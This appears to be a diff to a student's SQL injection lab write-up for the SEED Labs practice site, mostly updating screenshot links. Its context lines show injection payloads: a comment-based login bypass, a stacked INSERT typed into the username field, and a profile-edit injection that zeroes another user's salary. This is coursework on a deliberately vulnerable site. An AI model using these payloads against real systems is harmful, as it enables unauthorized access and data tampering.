@@ -25,6 +25,7 @@
 	 	SELECT id, name, eid, salary, birth, ssn, address, email, nickname, password
 		FROM credential
 		WHERE name='Admin' #' && password='xyz'
+![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%202.1.png)
     
 --> Task 2.2
 
@@ -38,19 +39,19 @@
 	  
     4. Run this location on browser
     
-![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%202.1.png)
+![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%202.2.png)
 
 
 --> Task 2.3: inject statment to append a row to current database:
 	
-	  INSERT INTO credential (name,eid) VALUES('Waleed', '17422');
+	  INSERT INTO credential (name,eid) VALUES('Shoaib', '17422');
 	  
     After row inserted, go to browser and input as:
 	  
     .USERNAME: "1=1; INSERT INTO credential (name,eid) VALUES('Shoaib','17422') #"
 	  .PASSWORD: "" (blank field)
     
-![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%201.png)
+![alt text]()
 
 
 
@@ -68,7 +69,7 @@ Run this on browder "http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
 	  1- Login as Username= 'Boby' #' and then open edit profile
 	  2- Update Phone Number: ',Salary=0 and remaining unchanges
     
-![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%202.2.png)
+![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%203.2.png)
 
 	Login as Alice
 		Assume login as Boby and keep Alice login too. Open Alice profile edit
@@ -93,3 +94,4 @@ Run this on browder "http://www.seedlabsqlinjection.com/unsafe_edit_frontend.php
    $conn->close();
 	 header("Location: unsafe_home.php");
 	 exit();
+![alt text](https://github.com/shoaibqureshi6/Sql-Injection/blob/main/task%203.3.png)
